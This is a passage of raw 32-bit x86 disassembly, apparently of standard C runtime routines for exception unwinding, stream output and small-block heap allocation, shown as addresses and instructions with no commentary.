  431282:	mov    DWORD PTR [ebp-0x8],eax
  431285:	mov    eax,DWORD PTR [ebp+0x10]
  431288:	mov    DWORD PTR [ebp-0x4],eax
  43128b:	lea    eax,[ebp-0x8]
  43128e:	mov    DWORD PTR [ebx-0x4],eax
  431291:	mov    esi,DWORD PTR [ebx+0xc]
  431294:	mov    edi,DWORD PTR [ebx+0x8]
  431297:	push   ebx
  431298:	call   0x436182
  43129d:	add    esp,0x4
  4312a0:	or     eax,eax
  4312a2:	je     0x43131f
  4312a4:	cmp    esi,0xffffffff
  4312a7:	je     0x431326
  4312a9:	lea    ecx,[esi+esi*2]
  4312ac:	mov    eax,DWORD PTR [edi+ecx*4+0x4]
  4312b0:	or     eax,eax
  4312b2:	je     0x43130d
  4312b4:	push   esi
  4312b5:	push   ebp
  4312b6:	lea    ebp,[ebx+0x10]
  4312b9:	xor    ebx,ebx
  4312bb:	xor    ecx,ecx
  4312bd:	xor    edx,edx
  4312bf:	xor    esi,esi
  4312c1:	xor    edi,edi
  4312c3:	call   eax
  4312c5:	pop    ebp
  4312c6:	pop    esi
  4312c7:	mov    ebx,DWORD PTR [ebp+0xc]
  4312ca:	or     eax,eax
  4312cc:	je     0x43130d
  4312ce:	js     0x431318
  4312d0:	mov    edi,DWORD PTR [ebx+0x8]
  4312d3:	push   ebx
  4312d4:	call   0x42f078
  4312d9:	add    esp,0x4
  4312dc:	lea    ebp,[ebx+0x10]
  4312df:	push   esi
  4312e0:	push   ebx
  4312e1:	call   0x42f0ba
  4312e6:	add    esp,0x8
  4312e9:	lea    ecx,[esi+esi*2]
  4312ec:	push   0x1
  4312ee:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4312f2:	call   0x42f14e
  4312f7:	mov    eax,DWORD PTR [edi+ecx*4]
  4312fa:	mov    DWORD PTR [ebx+0xc],eax
  4312fd:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  431301:	xor    ebx,ebx
  431303:	xor    ecx,ecx
  431305:	xor    edx,edx
  431307:	xor    esi,esi
  431309:	xor    edi,edi
  43130b:	call   eax
  43130d:	mov    edi,DWORD PTR [ebx+0x8]
  431310:	lea    ecx,[esi+esi*2]
  431313:	mov    esi,DWORD PTR [edi+ecx*4]
  431316:	jmp    0x4312a4
  431318:	mov    eax,0x0
  43131d:	jmp    0x431342
  43131f:	mov    eax,DWORD PTR [ebp+0x8]
  431322:	or     DWORD PTR [eax+0x4],0x8
  431326:	mov    eax,0x1
  43132b:	jmp    0x431342
  43132d:	push   ebp
  43132e:	lea    ebp,[ebx+0x10]
  431331:	push   0xffffffff
  431333:	push   ebx
  431334:	call   0x42f0ba
  431339:	add    esp,0x8
  43133c:	pop    ebp
  43133d:	mov    eax,0x1
  431342:	pop    ebp
  431343:	pop    edi
  431344:	pop    esi
  431345:	pop    ebx
  431346:	mov    esp,ebp
  431348:	pop    ebp
  431349:	ret    
  43134a:	push   ebp
  43134b:	mov    ecx,DWORD PTR [esp+0x8]
  43134f:	mov    ebp,DWORD PTR [ecx]
  431351:	mov    eax,DWORD PTR [ecx+0x1c]
  431354:	push   eax
  431355:	mov    eax,DWORD PTR [ecx+0x18]
  431358:	push   eax
  431359:	call   0x42f0ba
  43135e:	add    esp,0x8
  431361:	pop    ebp
  431362:	ret    0x4
  431365:	mov    eax,ds:0x43fca8
  43136a:	test   eax,eax
  43136c:	je     0x43137d
  43136e:	push   DWORD PTR [esp+0x4]
  431372:	call   eax
  431374:	test   eax,eax
  431376:	pop    ecx
  431377:	je     0x43137d
  431379:	xor    eax,eax
  43137b:	inc    eax
  43137c:	ret    
  43137d:	xor    eax,eax
  43137f:	ret    
  431380:	push   0xa
  431382:	call   0x432eed
  431387:	push   0x16
  431389:	call   0x4363d9
  43138e:	pop    ecx
  43138f:	pop    ecx
  431390:	push   0x3
  431392:	call   0x432ebe
  431397:	int3   
  431398:	push   ebp
  431399:	mov    ebp,esp
  43139b:	push   ebx
  43139c:	push   esi
  43139d:	mov    esi,DWORD PTR [ebp+0xc]
  4313a0:	mov    eax,DWORD PTR [esi+0xc]
  4313a3:	test   al,0x82
  4313a5:	mov    ebx,DWORD PTR [esi+0x10]
  4313a8:	je     0x4314a4
  4313ae:	test   al,0x40
  4313b0:	jne    0x4314a4
  4313b6:	test   al,0x1
  4313b8:	je     0x4313d1
  4313ba:	and    DWORD PTR [esi+0x4],0x0
  4313be:	test   al,0x10
  4313c0:	je     0x4314a4
  4313c6:	mov    ecx,DWORD PTR [esi+0x8]
  4313c9:	and    eax,0xfffffffe
  4313cc:	mov    DWORD PTR [esi],ecx
  4313ce:	mov    DWORD PTR [esi+0xc],eax
  4313d1:	mov    eax,DWORD PTR [esi+0xc]
  4313d4:	and    DWORD PTR [esi+0x4],0x0
  4313d8:	and    DWORD PTR [ebp+0xc],0x0
  4313dc:	and    eax,0xffffffef
  4313df:	or     eax,0x2
  4313e2:	test   ax,0x10c
  4313e6:	mov    DWORD PTR [esi+0xc],eax
  4313e9:	jne    0x43140d
  4313eb:	cmp    esi,0x43d428
  4313f1:	je     0x4313fb
  4313f3:	cmp    esi,0x43d448
  4313f9:	jne    0x431406
  4313fb:	push   ebx
  4313fc:	call   0x436552
  431401:	test   eax,eax
  431403:	pop    ecx
  431404:	jne    0x43140d
  431406:	push   esi
  431407:	call   0x43203f
  43140c:	pop    ecx
  43140d:	test   WORD PTR [esi+0xc],0x108
  431413:	push   edi
  431414:	je     0x43147a
  431416:	mov    eax,DWORD PTR [esi+0x8]
  431419:	mov    edi,DWORD PTR [esi]
  43141b:	lea    ecx,[eax+0x1]
  43141e:	mov    DWORD PTR [esi],ecx
  431420:	mov    ecx,DWORD PTR [esi+0x18]
  431423:	sub    edi,eax
  431425:	dec    ecx
  431426:	test   edi,edi
  431428:	mov    DWORD PTR [esi+0x4],ecx
  43142b:	jle    0x43143a
  43142d:	push   edi
  43142e:	push   eax
  43142f:	push   ebx
  431430:	call   0x43242d
  431435:	mov    DWORD PTR [ebp+0xc],eax
  431438:	jmp    0x43146d
  43143a:	cmp    ebx,0xffffffff
  43143d:	je     0x431458
  43143f:	mov    ecx,ebx
  431441:	sar    ecx,0x5
  431444:	mov    ecx,DWORD PTR [ecx*4+0x465100]
  43144b:	mov    eax,ebx
  43144d:	and    eax,0x1f
  431450:	lea    eax,[eax+eax*8]
  431453:	lea    eax,[ecx+eax*4]
  431456:	jmp    0x43145d
  431458:	mov    eax,0x43dc40
  43145d:	test   BYTE PTR [eax+0x4],0x20
  431461:	je     0x431470
  431463:	push   0x2
  431465:	push   0x0
  431467:	push   ebx
  431468:	call   0x432971
  43146d:	add    esp,0xc
  431470:	mov    eax,DWORD PTR [esi+0x8]
  431473:	mov    cl,BYTE PTR [ebp+0x8]
  431476:	mov    BYTE PTR [eax],cl
  431478:	jmp    0x43148e
  43147a:	xor    edi,edi
  43147c:	inc    edi
  43147d:	push   edi
  43147e:	lea    eax,[ebp+0x8]
  431481:	push   eax
  431482:	push   ebx
  431483:	call   0x43242d
  431488:	add    esp,0xc
  43148b:	mov    DWORD PTR [ebp+0xc],eax
  43148e:	cmp    DWORD PTR [ebp+0xc],edi
  431491:	pop    edi
  431492:	je     0x43149a
  431494:	or     DWORD PTR [esi+0xc],0x20
  431498:	jmp    0x4314aa
  43149a:	mov    eax,DWORD PTR [ebp+0x8]
  43149d:	and    eax,0xff
  4314a2:	jmp    0x4314ad
  4314a4:	or     eax,0x20
  4314a7:	mov    DWORD PTR [esi+0xc],eax
  4314aa:	or     eax,0xffffffff
  4314ad:	pop    esi
  4314ae:	pop    ebx
  4314af:	pop    ebp
  4314b0:	ret    
  4314b1:	cmp    DWORD PTR ds:0x43fcb0,0x2
  4314b8:	jne    0x4314c7
  4314ba:	cmp    DWORD PTR ds:0x43fcbc,0x5
  4314c1:	jb     0x4314c7
  4314c3:	xor    eax,eax
  4314c5:	inc    eax
  4314c6:	ret    
  4314c7:	push   0x3
  4314c9:	pop    eax
  4314ca:	ret    
  4314cb:	xor    eax,eax
  4314cd:	cmp    DWORD PTR [esp+0x4],eax
  4314d1:	push   0x0
  4314d3:	sete   al
  4314d6:	push   0x1000
  4314db:	push   eax
  4314dc:	call   DWORD PTR ds:0x439034
  4314e2:	test   eax,eax
  4314e4:	mov    ds:0x465230,eax
  4314e9:	je     0x431515
  4314eb:	call   0x4314b1
  4314f0:	cmp    eax,0x3
  4314f3:	mov    ds:0x465234,eax
  4314f8:	jne    0x431518
  4314fa:	push   0x3f8
  4314ff:	call   0x43151c
  431504:	test   eax,eax
  431506:	pop    ecx
  431507:	jne    0x431518
  431509:	push   DWORD PTR ds:0x465230
  43150f:	call   DWORD PTR ds:0x4390b8
  431515:	xor    eax,eax
  431517:	ret    
  431518:	xor    eax,eax
  43151a:	inc    eax
  43151b:	ret    
  43151c:	push   0x140
  431521:	push   0x0
  431523:	push   DWORD PTR ds:0x465230
  431529:	call   DWORD PTR ds:0x43900c
  43152f:	test   eax,eax
  431531:	mov    ds:0x46521c,eax
  431536:	jne    0x431539
  431538:	ret    
  431539:	mov    ecx,DWORD PTR [esp+0x4]
  43153d:	and    DWORD PTR ds:0x465214,0x0
  431544:	and    DWORD PTR ds:0x465218,0x0
  43154b:	mov    ds:0x465224,eax
  431550:	xor    eax,eax
  431552:	mov    DWORD PTR ds:0x465220,ecx
  431558:	mov    DWORD PTR ds:0x465228,0x10
  431562:	inc    eax
  431563:	ret    
  431564:	mov    eax,ds:0x465218
  431569:	lea    ecx,[eax+eax*4]
  43156c:	mov    eax,ds:0x46521c
  431571:	lea    ecx,[eax+ecx*4]
  431574:	jmp    0x431588
  431576:	mov    edx,DWORD PTR [esp+0x4]
  43157a:	sub    edx,DWORD PTR [eax+0xc]
  43157d:	cmp    edx,0x100000
  431583:	jb     0x43158e
  431585:	add    eax,0x14
  431588:	cmp    eax,ecx
  43158a:	jb     0x431576
  43158c:	xor    eax,eax
  43158e:	ret    
  43158f:	push   ebp
  431590:	mov    ebp,esp
  431592:	sub    esp,0x10
  431595:	mov    ecx,DWORD PTR [ebp+0x8]
  431598:	mov    eax,DWORD PTR [ecx+0x10]
  43159b:	push   esi
  43159c:	mov    esi,DWORD PTR [ebp+0xc]
  43159f:	push   edi
  4315a0:	mov    edi,esi
  4315a2:	sub    edi,DWORD PTR [ecx+0xc]
  4315a5:	add    esi,0xfffffffc
  4315a8:	shr    edi,0xf
  4315ab:	mov    ecx,edi
  4315ad:	imul   ecx,ecx,0x204
  4315b3:	lea    ecx,[ecx+eax*1+0x144]
  4315ba:	mov    DWORD PTR [ebp-0x10],ecx
  4315bd:	mov    ecx,DWORD PTR [esi]
  4315bf:	dec    ecx
  4315c0:	test   cl,0x1
  4315c3:	mov    DWORD PTR [ebp-0x4],ecx
  4315c6:	jne    0x4318a3
  4315cc:	push   ebx
  4315cd:	lea    ebx,[ecx+esi*1]
  4315d0:	mov    edx,DWORD PTR [ebx]
  4315d2:	mov    DWORD PTR [ebp-0xc],edx
  4315d5:	mov    edx,DWORD PTR [esi-0x4]
  4315d8:	mov    DWORD PTR [ebp-0x8],edx
  4315db:	mov    edx,DWORD PTR [ebp-0xc]
  4315de:	test   dl,0x1
  4315e1:	mov    DWORD PTR [ebp+0xc],ebx
  4315e4:	jne    0x43165a
  4315e6:	sar    edx,0x4
  4315e9:	dec    edx
  4315ea:	cmp    edx,0x3f
  4315ed:	jbe    0x4315f2
  4315ef:	push   0x3f
  4315f1:	pop    edx
  4315f2:	mov    ecx,DWORD PTR [ebx+0x4]
  4315f5:	cmp    ecx,DWORD PTR [ebx+0x8]
  4315f8:	jne    0x43163c
  4315fa:	cmp    edx,0x20
  4315fd:	mov    ebx,0x80000000
  431602:	jae    0x43161d
  431604:	mov    ecx,edx
  431606:	shr    ebx,cl
  431608:	lea    ecx,[edx+eax*1+0x4]
  43160c:	not    ebx
  43160e:	and    DWORD PTR [eax+edi*4+0x44],ebx
  431612:	dec    BYTE PTR [ecx]
  431614:	jne    0x431639
  431616:	mov    ecx,DWORD PTR [ebp+0x8]
  431619:	and    DWORD PTR [ecx],ebx
  43161b:	jmp    0x431639
  43161d:	lea    ecx,[edx-0x20]
  431620:	shr    ebx,cl
  431622:	lea    ecx,[edx+eax*1+0x4]
  431626:	not    ebx
  431628:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  43162f:	dec    BYTE PTR [ecx]
  431631:	jne    0x431639
  431633:	mov    ecx,DWORD PTR [ebp+0x8]
  431636:	and    DWORD PTR [ecx+0x4],ebx
  431639:	mov    ebx,DWORD PTR [ebp+0xc]
  43163c:	mov    edx,DWORD PTR [ebx+0x8]
  43163f:	mov    ebx,DWORD PTR [ebx+0x4]
  431642:	mov    ecx,DWORD PTR [ebp-0x4]
  431645:	add    ecx,DWORD PTR [ebp-0xc]
  431648:	mov    DWORD PTR [edx+0x4],ebx
  43164b:	mov    edx,DWORD PTR [ebp+0xc]
  43164e:	mov    ebx,DWORD PTR [edx+0x4]
  431651:	mov    edx,DWORD PTR [edx+0x8]
  431654:	mov    DWORD PTR [ebx+0x8],edx
  431657:	mov    DWORD PTR [ebp-0x4],ecx
  43165a:	mov    edx,ecx
  43165c:	sar    edx,0x4
  43165f:	dec    edx
  431660:	cmp    edx,0x3f
  431663:	jbe    0x431668
  431665:	push   0x3f
  431667:	pop    edx
  431668:	mov    ebx,DWORD PTR [ebp-0x8]
  43166b:	and    ebx,0x1
  43166e:	mov    DWORD PTR [ebp-0xc],ebx
  431671:	jne    0x431706
  431677:	sub    esi,DWORD PTR [ebp-0x8]
  43167a:	mov    ebx,DWORD PTR [ebp-0x8]
  43167d:	sar    ebx,0x4
  431680:	push   0x3f
  431682:	mov    DWORD PTR [ebp+0xc],esi
  431685:	dec    ebx
  431686:	pop    esi
  431687:	cmp    ebx,esi
  431689:	jbe    0x43168d
  43168b:	mov    ebx,esi
  43168d:	add    ecx,DWORD PTR [ebp-0x8]
  431690:	mov    edx,ecx
  431692:	sar    edx,0x4
  431695:	dec    edx
  431696:	cmp    edx,esi
  431698:	mov    DWORD PTR [ebp-0x4],ecx
  43169b:	jbe    0x43169f
  43169d:	mov    edx,esi
  43169f:	cmp    ebx,edx
  4316a1:	je     0x431701
  4316a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4316a6:	mov    esi,DWORD PTR [ecx+0x4]
  4316a9:	cmp    esi,DWORD PTR [ecx+0x8]
  4316ac:	jne    0x4316e9
  4316ae:	cmp    ebx,0x20
  4316b1:	mov    esi,0x80000000
  4316b6:	jae    0x4316cf
  4316b8:	mov    ecx,ebx
  4316ba:	shr    esi,cl
  4316bc:	not    esi
  4316be:	and    DWORD PTR [eax+edi*4+0x44],esi
  4316c2:	dec    BYTE PTR [ebx+eax*1+0x4]
  4316c6:	jne    0x4316e9
  4316c8:	mov    ecx,DWORD PTR [ebp+0x8]
  4316cb:	and    DWORD PTR [ecx],esi
  4316cd:	jmp    0x4316e9
  4316cf:	lea    ecx,[ebx-0x20]
  4316d2:	shr    esi,cl
  4316d4:	not    esi
  4316d6:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4316dd:	dec    BYTE PTR [ebx+eax*1+0x4]
  4316e1:	jne    0x4316e9
  4316e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4316e6:	and    DWORD PTR [ecx+0x4],esi
  4316e9:	mov    ecx,DWORD PTR [ebp+0xc]
  4316ec:	mov    esi,DWORD PTR [ecx+0x8]
  4316ef:	mov    ecx,DWORD PTR [ecx+0x4]
  4316f2:	mov    DWORD PTR [esi+0x4],ecx
  4316f5:	mov    ecx,DWORD PTR [ebp+0xc]
  4316f8:	mov    esi,DWORD PTR [ecx+0x4]
  4316fb:	mov    ecx,DWORD PTR [ecx+0x8]
  4316fe:	mov    DWORD PTR [esi+0x8],ecx
  431701:	mov    esi,DWORD PTR [ebp+0xc]
  431704:	jmp    0x431709
  431706:	mov    ebx,DWORD PTR [ebp+0x8]
  431709:	cmp    DWORD PTR [ebp-0xc],0x0
  43170d:	jne    0x431717
  43170f:	cmp    ebx,edx
  431711:	je     0x431797
  431717:	mov    ecx,DWORD PTR [ebp-0x10]
  43171a:	lea    ecx,[ecx+edx*8]
  43171d:	mov    ebx,DWORD PTR [ecx+0x4]
  431720:	mov    DWORD PTR [esi+0x8],ecx
  431723:	mov    DWORD PTR [esi+0x4],ebx
  431726:	mov    DWORD PTR [ecx+0x4],esi
  431729:	mov    ecx,DWORD PTR [esi+0x4]
  43172c:	mov    DWORD PTR [ecx+0x8],esi
  43172f:	mov    ecx,DWORD PTR [esi+0x4]
  431732:	cmp    ecx,DWORD PTR [esi+0x8]
  431735:	jne    0x431797
  431737:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  43173b:	mov    BYTE PTR [ebp+0xf],cl
  43173e:	inc    cl
  431740:	cmp    edx,0x20
  431743:	mov    BYTE PTR [edx+eax*1+0x4],cl
  431747:	jae    0x43176e
  431749:	cmp    BYTE PTR [ebp+0xf],0x0
  43174d:	jne    0x43175d
  43174f:	mov    ecx,edx
  431751:	mov    ebx,0x80000000
  431756:	shr    ebx,cl
  431758:	mov    ecx,DWORD PTR [ebp+0x8]
  43175b:	or     DWORD PTR [ecx],ebx
  43175d:	mov    ebx,0x80000000
  431762:	mov    ecx,edx
  431764:	shr    ebx,cl
  431766:	lea    eax,[eax+edi*4+0x44]
  43176a:	or     DWORD PTR [eax],ebx
  43176c:	jmp    0x431797
  43176e:	cmp    BYTE PTR [ebp+0xf],0x0
  431772:	jne    0x431784
  431774:	lea    ecx,[edx-0x20]
  431777:	mov    ebx,0x80000000
  43177c:	shr    ebx,cl
  43177e:	mov    ecx,DWORD PTR [ebp+0x8]
  431781:	or     DWORD PTR [ecx+0x4],ebx
  431784:	lea    ecx,[edx-0x20]
  431787:	mov    edx,0x80000000
  43178c:	shr    edx,cl
  43178e:	lea    eax,[eax+edi*4+0xc4]
  431795:	or     DWORD PTR [eax],edx
  431797:	mov    eax,DWORD PTR [ebp-0x4]
  43179a:	mov    DWORD PTR [esi],eax
  43179c:	mov    DWORD PTR [eax+esi*1-0x4],eax
  4317a0:	mov    eax,DWORD PTR [ebp-0x10]
  4317a3:	dec    DWORD PTR [eax]
  4317a5:	jne    0x4318a2
  4317ab:	mov    eax,ds:0x465214
  4317b0:	test   eax,eax
  4317b2:	je     0x431894
  4317b8:	mov    ecx,DWORD PTR ds:0x46522c
  4317be:	mov    esi,DWORD PTR ds:0x439020
  4317c4:	push   0x4000
  4317c9:	shl    ecx,0xf
  4317cc:	add    ecx,DWORD PTR [eax+0xc]
  4317cf:	mov    ebx,0x8000
  4317d4:	push   ebx
  4317d5:	push   ecx
  4317d6:	call   esi
  4317d8:	mov    ecx,DWORD PTR ds:0x46522c
  4317de:	mov    eax,ds:0x465214
  4317e3:	mov    edx,0x80000000
  4317e8:	shr    edx,cl
  4317ea:	or     DWORD PTR [eax+0x8],edx
  4317ed:	mov    eax,ds:0x465214
  4317f2:	mov    eax,DWORD PTR [eax+0x10]
  4317f5:	mov    ecx,DWORD PTR ds:0x46522c
  4317fb:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  431803:	mov    eax,ds:0x465214
  431808:	mov    eax,DWORD PTR [eax+0x10]
  43180b:	dec    BYTE PTR [eax+0x43]
  43180e:	mov    eax,ds:0x465214
  431813:	mov    ecx,DWORD PTR [eax+0x10]
  431816:	cmp    BYTE PTR [ecx+0x43],0x0
  43181a:	jne    0x431825
  43181c:	and    DWORD PTR [eax+0x4],0xfffffffe
  431820:	mov    eax,ds:0x465214
  431825:	cmp    DWORD PTR [eax+0x8],0xffffffff
  431829:	jne    0x431894
  43182b:	push   ebx
  43182c:	push   0x0
  43182e:	push   DWORD PTR [eax+0xc]
  431831:	call   esi
  431833:	mov    eax,ds:0x465214
  431838:	push   DWORD PTR [eax+0x10]
  43183b:	push   0x0
  43183d:	push   DWORD PTR ds:0x465230
  431843:	call   DWORD PTR ds:0x439014
  431849:	mov    eax,ds:0x465218
  43184e:	mov    edx,DWORD PTR ds:0x46521c
  431854:	lea    eax,[eax+eax*4]
  431857:	shl    eax,0x2
  43185a:	mov    ecx,eax
  43185c:	mov    eax,ds:0x465214
  431861:	sub    ecx,eax
  431863:	lea    ecx,[ecx+edx*1-0x14]
  431867:	push   ecx
  431868:	lea    ecx,[eax+0x14]
  43186b:	push   ecx
  43186c:	push   eax
  43186d:	call   0x42ddb0
  431872:	mov    eax,DWORD PTR [ebp+0x8]
  431875:	add    esp,0xc
  431878:	dec    DWORD PTR ds:0x465218
  43187e:	cmp    eax,DWORD PTR ds:0x465214
  431884:	jbe    0x43188a
  431886:	sub    DWORD PTR [ebp+0x8],0x14
  43188a:	mov    eax,ds:0x46521c
  43188f:	mov    ds:0x465224,eax
  431894:	mov    eax,DWORD PTR [ebp+0x8]
  431897:	mov    ds:0x465214,eax
  43189c:	mov    DWORD PTR ds:0x46522c,edi
  4318a2:	pop    ebx
  4318a3:	pop    edi
  4318a4:	pop    esi
  4318a5:	leave  
  4318a6:	ret    
  4318a7:	mov    eax,ds:0x465218
  4318ac:	mov    ecx,DWORD PTR ds:0x465228
  4318b2:	push   edi
  4318b3:	xor    edi,edi
  4318b5:	cmp    eax,ecx
  4318b7:	jne    0x4318ed
  4318b9:	lea    eax,[ecx+ecx*4+0x50]
  4318bd:	shl    eax,0x2
  4318c0:	push   eax
  4318c1:	push   DWORD PTR ds:0x46521c
  4318c7:	push   edi
  4318c8:	push   DWORD PTR ds:0x465230
  4318ce:	call   DWORD PTR ds:0x439004
  4318d4:	cmp    eax,edi
  4318d6:	jne    0x4318dc
  4318d8:	xor    eax,eax
  4318da:	pop    edi
  4318db:	ret    
  4318dc:	add    DWORD PTR ds:0x465228,0x10
  4318e3:	mov    ds:0x46521c,eax
  4318e8:	mov    eax,ds:0x465218
  4318ed:	mov    ecx,DWORD PTR ds:0x46521c
  4318f3:	push   esi
  4318f4:	push   0x41c4
  4318f9:	push   0x8
  4318fb:	push   DWORD PTR ds:0x465230
  431901:	lea    eax,[eax+eax*4]
  431904:	lea    esi,[ecx+eax*4]
  431907:	call   DWORD PTR ds:0x43900c
  43190d:	cmp    eax,edi
  43190f:	mov    DWORD PTR [esi+0x10],eax
  431912:	jne    0x431918
  431914:	xor    eax,eax
  431916:	jmp    0x43195b
  431918:	push   0x4
  43191a:	push   0x2000
  43191f:	push   0x100000
  431924:	push   edi
  431925:	call   DWORD PTR ds:0x439044
  43192b:	cmp    eax,edi
  43192d:	mov    DWORD PTR [esi+0xc],eax
  431930:	jne    0x431944
  431932:	push   DWORD PTR [esi+0x10]
  431935:	push   edi
  431936:	push   DWORD PTR ds:0x465230
  43193c:	call   DWORD PTR ds:0x439014
  431942:	jmp    0x431914
  431944:	or     DWORD PTR [esi+0x8],0xffffffff
  431948:	mov    DWORD PTR [esi],edi
  43194a:	mov    DWORD PTR [esi+0x4],edi
  43194d:	inc    DWORD PTR ds:0x465218
  431953:	mov    eax,DWORD PTR [esi+0x10]
  431956:	or     DWORD PTR [eax],0xffffffff
  431959:	mov    eax,esi
  43195b:	pop    esi
  43195c:	pop    edi
  43195d:	ret    
  43195e:	push   ebp
  43195f:	mov    ebp,esp
  431961:	push   ecx
  431962:	push   ecx
  431963:	mov    ecx,DWORD PTR [ebp+0x8]
  431966:	mov    eax,DWORD PTR [ecx+0x8]
  431969:	push   ebx
  43196a:	push   esi
  43196b:	mov    esi,DWORD PTR [ecx+0x10]
  43196e:	push   edi
  43196f:	xor    ebx,ebx
  431971:	jmp    0x431976
  431973:	shl    eax,1
  431975:	inc    ebx
  431976:	test   eax,eax
  431978:	jge    0x431973
  43197a:	mov    eax,ebx
  43197c:	imul   eax,eax,0x204
  431982:	lea    eax,[eax+esi*1+0x144]
  431989:	push   0x3f
  43198b:	mov    DWORD PTR [ebp-0x8],eax
  43198e:	pop    edx
  43198f:	mov    DWORD PTR [eax+0x8],eax
  431992:	mov    DWORD PTR [eax+0x4],eax
  431995:	add    eax,0x8
  431998:	dec    edx
  431999:	jne    0x43198f
  43199b:	push   0x4
  43199d:	mov    edi,ebx
  43199f:	push   0x1000
  4319a4:	shl    edi,0xf
  4319a7:	add    edi,DWORD PTR [ecx+0xc]
  4319aa:	push   0x8000
  4319af:	push   edi
  4319b0:	call   DWORD PTR ds:0x439044
  4319b6:	test   eax,eax
  4319b8:	jne    0x4319c2
  4319ba:	or     eax,0xffffffff
  4319bd:	jmp    0x431a5f
  4319c2:	lea    edx,[edi+0x7000]
  4319c8:	cmp    edi,edx
  4319ca:	mov    DWORD PTR [ebp-0x4],edx
  4319cd:	ja     0x431a12
  4319cf:	mov    ecx,edx
  4319d1:	sub    ecx,edi
  4319d3:	shr    ecx,0xc
  4319d6:	lea    eax,[edi+0x10]
  4319d9:	inc    ecx
  4319da:	or     DWORD PTR [eax-0x8],0xffffffff
  4319de:	or     DWORD PTR [eax+0xfec],0xffffffff
  4319e5:	lea    edx,[eax+0xffc]
  4319eb:	mov    DWORD PTR [eax],edx
  4319ed:	lea    edx,[eax-0x1004]
  4319f3:	mov    DWORD PTR [eax-0x4],0xff0
  4319fa:	mov    DWORD PTR [eax+0x4],edx
  4319fd:	mov    DWORD PTR [eax+0xfe8],0xff0
  431a07:	add    eax,0x1000
  431a0c:	dec    ecx
  431a0d:	jne    0x4319da
  431a0f:	mov    edx,DWORD PTR [ebp-0x4]
  431a12:	mov    eax,DWORD PTR [ebp-0x8]
  431a15:	add    eax,0x1f8
  431a1a:	lea    ecx,[edi+0xc]
  431a1d:	mov    DWORD PTR [eax+0x4],ecx
  431a20:	mov    DWORD PTR [ecx+0x8],eax
  431a23:	lea    ecx,[edx+0xc]
  431a26:	mov    DWORD PTR [eax+0x8],ecx
  431a29:	mov    DWORD PTR [ecx+0x4],eax
  431a2c:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  431a31:	xor    edi,edi
  431a33:	inc    edi
  431a34:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  431a3b:	mov    al,BYTE PTR [esi+0x43]
  431a3e:	mov    cl,al
  431a40:	inc    cl
  431a42:	test   al,al
  431a44:	mov    eax,DWORD PTR [ebp+0x8]
  431a47:	mov    BYTE PTR [esi+0x43],cl
  431a4a:	jne    0x431a4f
  431a4c:	or     DWORD PTR [eax+0x4],edi
  431a4f:	mov    edx,0x80000000
  431a54:	mov    ecx,ebx
  431a56:	shr    edx,cl
  431a58:	not    edx
  431a5a:	and    DWORD PTR [eax+0x8],edx
  431a5d:	mov    eax,ebx
  431a5f:	pop    edi
  431a60:	pop    esi
  431a61:	pop    ebx
  431a62:	leave  
  431a63:	ret    
  431a64:	push   ebp
  431a65:	mov    ebp,esp
  431a67:	sub    esp,0xc
  431a6a:	mov    ecx,DWORD PTR [ebp+0x8]
  431a6d:	mov    eax,DWORD PTR [ecx+0x10]
  431a70:	push   ebx
  431a71:	push   esi
  431a72:	mov    esi,DWORD PTR [ebp+0x10]
  431a75:	push   edi
  431a76:	mov    edi,DWORD PTR [ebp+0xc]
  431a79:	mov    edx,edi
  431a7b:	sub    edx,DWORD PTR [ecx+0xc]
  431a7e:	add    esi,0x17
  431a81:	shr    edx,0xf
  431a84:	mov    ecx,edx
  431a86:	imul   ecx,ecx,0x204
  431a8c:	lea    ecx,[ecx+eax*1+0x144]
  431a93:	mov    DWORD PTR [ebp-0xc],ecx
  431a96:	mov    ecx,DWORD PTR [edi-0x4]
  431a99:	and    esi,0xfffffff0
  431a9c:	dec    ecx
  431a9d:	cmp    esi,ecx
  431a9f:	lea    edi,[ecx+edi*1-0x4]
  431aa3:	mov    ebx,DWORD PTR [edi]
  431aa5:	mov    DWORD PTR [ebp+0x10],ecx
  431aa8:	mov    DWORD PTR [ebp-0x4],ebx
  431aab:	jle    0x431c06
  431ab1:	test   bl,0x1
  431ab4:	jne    0x431bff
  431aba:	add    ebx,ecx
  431abc:	cmp    esi,ebx
  431abe:	jg     0x431bff
  431ac4:	mov    ecx,DWORD PTR [ebp-0x4]
  431ac7:	sar    ecx,0x4
  431aca:	dec    ecx
  431acb:	cmp    ecx,0x3f
  431ace:	mov    DWORD PTR [ebp-0x8],ecx
  431ad1:	jbe    0x431ad9
  431ad3:	push   0x3f
  431ad5:	pop    ecx
  431ad6:	mov    DWORD PTR [ebp-0x8],ecx
  431ad9:	mov    ebx,DWORD PTR [edi+0x4]
  431adc:	cmp    ebx,DWORD PTR [edi+0x8]
  431adf:	jne    0x431b24
  431ae1:	cmp    ecx,0x20
  431ae4:	mov    ebx,0x80000000
  431ae9:	jae    0x431b05
  431aeb:	shr    ebx,cl
  431aed:	mov    ecx,DWORD PTR [ebp-0x8]
  431af0:	lea    ecx,[ecx+eax*1+0x4]
  431af4:	not    ebx
  431af6:	and    DWORD PTR [eax+edx*4+0x44],ebx
  431afa:	dec    BYTE PTR [ecx]
  431afc:	jne    0x431b24
  431afe:	mov    ecx,DWORD PTR [ebp+0x8]
  431b01:	and    DWORD PTR [ecx],ebx
  431b03:	jmp    0x431b24
  431b05:	add    ecx,0xffffffe0
  431b08:	shr    ebx,cl
  431b0a:	mov    ecx,DWORD PTR [ebp-0x8]
  431b0d:	lea    ecx,[ecx+eax*1+0x4]
  431b11:	not    ebx
  431b13:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  431b1a:	dec    BYTE PTR [ecx]
  431b1c:	jne    0x431b24
  431b1e:	mov    ecx,DWORD PTR [ebp+0x8]
  431b21:	and    DWORD PTR [ecx+0x4],ebx
  431b24:	mov    ecx,DWORD PTR [edi+0x8]
  431b27:	mov    ebx,DWORD PTR [edi+0x4]
  431b2a:	mov    DWORD PTR [ecx+0x4],ebx
  431b2d:	mov    ecx,DWORD PTR [edi+0x4]
